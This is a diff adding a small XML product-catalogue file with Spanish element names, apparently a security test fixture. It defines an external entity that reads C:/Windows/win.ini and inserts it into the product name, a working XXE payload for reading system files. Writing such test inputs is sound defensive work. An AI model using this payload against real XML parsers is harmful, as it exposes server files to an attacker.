@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE catalogo [
+  <!ENTITY secreto SYSTEM "file:///C:/Windows/win.ini">
+]>
+<catalogo>
+  <producto>
+    <codigo>XXE-801</codigo><nombre>&secreto;</nombre>
+    <precio>1.00</precio><stock>1</stock>
+    <categoriaId>1</categoriaId><proveedorId>1</proveedorId>
+  </producto>
+</catalogo>
